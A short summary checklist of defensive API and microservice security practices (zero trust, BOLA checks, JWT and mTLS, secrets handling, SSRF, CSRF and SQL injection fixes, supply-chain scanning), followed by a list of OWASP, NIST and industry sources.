- ☑ **Zero trust** = "never trust, always verify" — authenticate every service-to-service call.
- ☑ **BOLA is OWASP API #1** — always validate ownership, not just existence.
- ☑ **JWT: RS256 > HS256**, short TTL + refresh rotation, httpOnly cookies.
- ☑ **mTLS** = both sides present certs — no anonymous internal callers.
- ☑ **Secrets**: never in Git, use Vault/ASM, rotate regularly, dynamic secrets where possible.
- ☑ **SSRF fix**: allowlist outbound URLs, block RFC1918 + link-local.
- ☑ **CSRF fix**: SameSite=Strict cookie attribute + CSRF token.
- ☑ **SQL injection fix**: parameterised queries — zero exceptions.
- ☑ **Supply chain**: SBOM + CVE scanning in CI/CD, pin dependencies, scan containers.

---

*Sources: OWASP API Security Top 10 2023, OWASP Secure by Design Framework, OWASP Microservices Security Cheat Sheet, NIST SP 800-207 (Zero Trust), Java Code Geeks (Zero Trust Java Dec 2025), Endgrate (Service Mesh Auth Patterns 2024), DZone (Istio + OPA Zero Trust Nov 2025), ECOSIRE (API Security Best Practices Mar 2026), Invicti (OWASP Top 10 2025), Akamai (OWASP API Top 10 2023), Curity (JWT Security), OWASP OAuth2 Cheat Sheet, WSO2 (Microservices Zero Trust) — combined with first-principles security architecture knowledge.*